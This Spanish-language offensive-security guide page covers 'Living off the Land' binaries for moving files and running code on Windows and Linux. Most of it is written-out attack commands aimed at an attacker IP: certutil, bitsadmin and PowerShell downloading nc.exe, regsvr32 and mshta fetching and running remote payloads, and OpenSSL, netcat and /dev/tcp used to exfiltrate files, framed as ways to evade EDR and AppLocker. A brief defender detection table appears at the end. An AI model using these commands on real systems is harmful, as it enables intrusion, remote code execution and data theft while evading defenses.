# Living off The Land — LOLBins

**Living off The Land (LOtL)** es la técnica de usar herramientas y binarios legítimos ya presentes en el sistema operativo para realizar operaciones maliciosas — incluyendo transferencias de archivos. Como los binarios son firmados por Microsoft o el fabricante del SO, muchos AV/EDR los permiten por defecto. Son especialmente útiles cuando las herramientas propias están bloqueadas por AppLocker o WDAC.

### LOLBins en Windows

El proyecto **LOLBAS** (Living Off The Land Binaries, Scripts and Libraries) cataloga todos los binarios de Windows que pueden usarse para descargar, subir o ejecutar código:

`https://lolbas-project.github.io`

#### CertReq.exe — Upload

`CertReq.exe` es una herramienta de gestión de certificados que puede usarse para enviar archivos a un servidor HTTP.

```cmd
# Subir un archivo a un servidor en escucha
certreq.exe -Post -config http://192.168.1.100/ C:\Windows\win.ini

# En el atacante — recibir con Netcat
nc -lvnp 80
# El contenido del archivo llega en el body de la petición POST
```

#### CertUtil.exe — Download

Diseñado para operaciones con certificados, pero ampliamente usado (y detectado) para descargas.

```cmd
# Descargar un archivo (muy detectado por EDRs)
certutil -urlcache -split -f http://192.168.1.100/nc.exe nc.exe

# Versión sin caché
certutil -verifyctl -split -f http://192.168.1.100/nc.exe nc.exe
```

> `certutil` para descarga es una de las técnicas más detectadas. Los EDRs modernos alertan casi universalmente sobre su uso para descargar ejecutables.

#### Bitsadmin — Download

Background Intelligent Transfer Service — usado para Windows Update, raramente bloqueado.

```cmd
# Descargar en background
bitsadmin /transfer n http://192.168.1.100/nc.exe C:\Temp\nc.exe

# Descargar de forma silenciosa
bitsadmin /transfer myDownloadJob /download /priority normal http://192.168.1.100/nc.exe C:\Temp\nc.exe
```

#### PowerShell — Download (varios métodos)

```powershell
# Start-BitsTransfer (BITS via PowerShell)
Start-BitsTransfer -Source "http://192.168.1.100/nc.exe" -Destination "C:\Temp\nc.exe"

# Con autenticación
Start-BitsTransfer -Source "http://192.168.1.100/nc.exe" -Destination "C:\Temp\nc.exe" -Credential (Get-Credential)
```

#### Regsvr32.exe — Ejecución remota (scriptlet)

```cmd
# Descargar y ejecutar un scriptlet COM desde URL
regsvr32.exe /s /n /u /i:http://192.168.1.100/payload.sct scrobj.dll
```

#### MSConfig / MSHTA — Ejecución

```cmd
# MSHTA — ejecutar HTA remoto
mshta.exe http://192.168.1.100/payload.hta
```

### LOLBins en Linux

El proyecto equivalente para Linux es **GTFOBins**:

`https://gtfobins.github.io`

Muchos de estos binarios tienen doble función: escalada de privilegios Y transferencia de archivos.

#### OpenSSL — Transfer cifrada

```bash
# En el atacante — levantar servidor OpenSSL
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem
openssl s_server -quiet -accept 8080 -cert cert.pem -key key.pem < /tmp/LinEnum.sh

# En el objetivo — recibir
openssl s_client -connect 192.168.1.100:8080 -quiet > LinEnum.sh
```

```bash
# En dirección contraria — exfiltrar desde el objetivo
# En el atacante — recibir
openssl s_server -quiet -accept 8080 -cert cert.pem -key key.pem > loot.tar.gz

# En el objetivo — enviar
openssl s_client -connect 192.168.1.100:8080 -quiet < /tmp/loot.tar.gz
```

#### Wget / cURL (ya cubiertos en Linux)

```bash
wget http://servidor/archivo -O /tmp/archivo
curl http://servidor/archivo -o /tmp/archivo
```

#### Python / PHP / Ruby / Perl

Ver página [Transferencia con Código](https://claude.ai/chat/03-code.md).

#### SCP / SFTP

```bash
scp archivo usuario@servidor:/destino/
sftp usuario@servidor
```

#### Bash /dev/tcp

```bash
exec 3<>/dev/tcp/192.168.1.100/80
echo -e "GET /archivo HTTP/1.1\nHost: 192.168.1.100\n\n" >&3
cat <&3 > archivo
```

#### Netcat

```bash
# Receptor
nc -lvnp 8080 > archivo

# Emisor
cat archivo > /dev/tcp/192.168.1.100/8080
```

#### xxd / od — Base64 sin base64

En sistemas donde `base64` no está disponible:

```bash
# Codificar con xxd
xxd -p archivo | tr -d '\n'

# Decodificar
echo "hex_string" | xxd -r -p > archivo
```

### Detección de LOLBins

Los defensores monitorizan el uso anómalo de estos binarios:

| Binario          | Indicador sospechoso                       | Event ID            |
| ---------------- | ------------------------------------------ | ------------------- |
| `certutil.exe`   | Argumentos `-urlcache` o `-decode`         | 4688 (command line) |
| `bitsadmin.exe`  | Creación de jobs apuntando a IPs externas  | 4688                |
| `mshta.exe`      | Ejecutar desde URL o path inusual          | 4688                |
| `regsvr32.exe`   | `/i:http://...` o `scrobj.dll`             | 4688                |
| `powershell.exe` | `DownloadString`, `IEX`, `-EncodedCommand` | 4104 (ScriptBlock)  |

> **GTFOBins** y **LOLBAS** son referencias indispensables. Antes de buscar subir una herramienta externa, comprobar si algún binario ya presente en el sistema puede hacer lo mismo.

> OpenSSL para transferencias es especialmente valioso porque cifra el contenido y usa puertos no estándar, lo que dificulta la detección basada en firmas de contenido.
